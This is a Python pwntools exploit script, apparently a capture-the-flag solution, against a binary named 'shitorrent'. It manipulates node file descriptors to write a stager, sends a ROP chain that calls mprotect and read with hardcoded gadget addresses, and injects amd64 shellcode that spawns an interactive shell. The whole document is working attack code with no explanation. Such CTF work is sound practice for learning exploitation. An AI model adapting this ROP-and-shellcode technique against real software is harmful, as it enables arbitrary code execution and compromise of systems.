from pwn import *
from socket import *
import multiprocessing

def get_prompt():
	p.recvuntil("[g]et flag\n")

def add_node(host,port):
	p.sendline("a")
	p.recvuntil("enter host")
	p.send(host)
	p.recvuntil("enter port")
	p.send(str(port))
	get_prompt()

def remove_node(fd):
	p.sendline("r")
	p.sendline(str(fd))
	get_prompt()

def admin_server(s):
	s.listen(5)

	while True:
		c,a = s.accept()
		data = c.recv(16)
		if data == "SHITorrent HELO\n":
			pass
		elif data == "DIE DIE DIE":
			break
		else:
			raise Exception("what the fuck is this packet?")

		c.send("TORADMIN\x00")
		c.close()

	s.close()
	log.info("killed admin server")

def client_server(s):
	s.listen(5)

	while True:
		c,a = s.accept()
		data = c.recv(16)
		if data == "SHITorrent HELO\n":
			pass
		elif data == "DIE DIE DIE":
			break

		else:
			raise Exception("what the fuck is this packet?")

		c.send("TORCLIENT\x00")
		c.close()

	s.close()
	log.info("killed client server")

def open_servers():
	# open sockets
	global p1,p2
	adminsock = socket(AF_INET,SOCK_STREAM)
	adminsock.bind(("0.0.0.0",0))
	clisock = socket(AF_INET,SOCK_STREAM)
	clisock.bind(("0.0.0.0",0))

	ah, ap = adminsock.getsockname()
	ch, cp = clisock.getsockname()

	p1 = multiprocessing.Process(target=admin_server,args=(adminsock,))
	p1.start()
	log.info("started admin server on %s:%d"%(ah,ap))
	p2 = multiprocessing.Process(target=client_server,args=(clisock,))
	p2.start()
	log.info("started client server on %s:%d"%(ch,cp))

	return (ah,ap),(ch,cp)

def close_servers():
	p1.terminate()
	p2.terminate()

def bitat(string, idx):
	string_idx = idx//8
	return ord(string[string_idx]) & (1<<(idx%8))

if __name__ == "__main__":

	context.os = 'linux'
	context.arch = 'amd64'

	shellcode = asm(shellcraft.amd64.sh())

	pop_rax = 0x00000000004657fc
	pop_rdi = 0x0000000000400706
	pop_rsi = 0x0000000000407888
	pop_rdx = 0x0000000000465855
	pop_rdx_rsi = 0x0000000000468059
	pop_rsp = 0x0000000000403368
	mprotect = 0x466710
	read = 0x465840
	puts = 0x42C1E0 
	bss = 0x6DAC00 

	
	ROP = p64(pop_rdi)+p64(0x400000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mprotect)
	ROP += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x400000)+p64(pop_rdx)+p64(len(shellcode))+p64(read)
	ROP += p64(0x400000)

	stager = p64(pop_rdx)+p64(218+len(ROP))+p64(read)+p64(0)

	admin, client = open_servers()

	ah, ap = admin
	ch, cp = client

	p = process("./shitorrent")

	for i in range(0x88*8-3):
		add_node(ah,ap)

	for i in range(0x8*8):
		add_node(ch,cp)
	
	for i in range(len(stager)*8):
		add_node(ah,ap)
		log.info("phase 3 %d/%d"%(i+1,len(stager)*8))
	log.info("phase 3 done")

	offset = 0x88*8+0x10*8

	for i in range(len(stager)*8):
		if not bitat(stager,i):
			remove_node(i+offset)
	log.info("phase 4 done")
	
	close_servers()
	#gdb.attach(p,gdbscript="b *0x040176F")

	p.sendline("q")
	sleep(0.5)
	p.send("A"*218+ROP)
	sleep(0.5)
	p.send(shellcode)
	p.interactive()
